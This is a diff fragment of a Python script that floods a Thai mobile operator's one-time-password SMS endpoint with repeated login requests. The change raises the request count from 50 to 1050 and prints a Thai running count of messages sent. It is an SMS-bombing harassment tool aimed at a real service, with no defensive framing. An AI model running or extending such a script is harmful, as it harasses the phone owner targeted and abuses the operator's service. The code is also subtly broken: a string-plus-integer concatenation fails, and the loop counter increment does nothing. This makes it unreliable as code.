@@ -30,7 +30,8 @@ data = {
   "otpChannel":"sms"
 }
 
-for i in range(50):
+for i in range(1050):
+  i += 1
   name = requests.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW",data=data, headers=headers)
 
-  print(name.text)
+  print("ส่งข้อความไปแล้วจำนวน "+i)
